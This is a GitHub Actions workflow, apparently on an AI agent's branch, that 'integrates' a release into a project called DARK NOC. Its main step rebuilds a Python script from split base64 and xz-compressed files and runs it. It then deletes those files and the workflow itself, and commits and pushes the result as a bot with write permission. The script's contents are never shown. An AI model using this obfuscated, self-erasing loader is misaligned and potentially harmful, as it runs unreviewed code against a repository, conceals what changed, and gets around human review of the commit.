name: DARK Realm Integration Transaction

on:
  push:
    branches: ["codex/dark-realm-noc-v2.9.0"]
    paths:
      - ".github/workflows/realm-integration.yml"

permissions:
  contents: write

# Transaction trigger: corrected Realm payload v5.
jobs:
  integrate:
    runs-on: ubuntu-24.04
    timeout-minutes: 20
    steps:
      - name: Checkout integration branch
        uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: "3.12"
          cache: pip

      - name: Set up Node
        uses: actions/setup-node@v4
        with:
          node-version: "22"

      - name: Restore and apply verified Realm integration patch
        shell: bash
        run: |
          set -euo pipefail
          cat .realm-bootstrap/part00 .realm-bootstrap/part01 .realm-bootstrap/part02 > /tmp/realm-integration.b64
          base64 -d /tmp/realm-integration.b64 > /tmp/realm-integration.py.xz
          xz -t /tmp/realm-integration.py.xz
          xz -dc /tmp/realm-integration.py.xz > /tmp/integrate_realm_noc.py
          python -m py_compile /tmp/integrate_realm_noc.py
          python /tmp/integrate_realm_noc.py
          rm -rf .realm-bootstrap .github/workflows/realm-integration.yml

      - name: Install project dependencies
        run: pip install -r hub/requirements.txt -r agent/requirements.txt

      - name: Static validation
        shell: bash
        run: |
          set -euo pipefail
          python -m compileall -q hub agent tests
          node --check hub/static/app.js
          for script in *.sh scripts/*.sh; do bash -n "$script"; done
          bash -n darknoc

      - name: Full regression suite
        shell: bash
        run: |
          set -euo pipefail
          python tests/smoke.py
          python tests/agent_logic.py
          python tests/file_ops.py
          python tests/noc_features.py
          python tests/server_cli.py
          python tests/realm_integration.py

      - name: Reproducible release validation
        shell: bash
        run: |
          set -euo pipefail
          scripts/build-release.sh
          first_build="$(mktemp -d)"
          cp -a dist/. "$first_build/"
          scripts/build-release.sh
          diff -qr "$first_build" dist

      - name: Publish validated Realm integration
        shell: bash
        run: |
          set -euo pipefail
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add -A
          git diff --cached --check
          git commit -m "feat: integrate DARK Realm Pro into DARK NOC v2.9.0"
          git push origin HEAD:codex/dark-realm-noc-v2.9.0
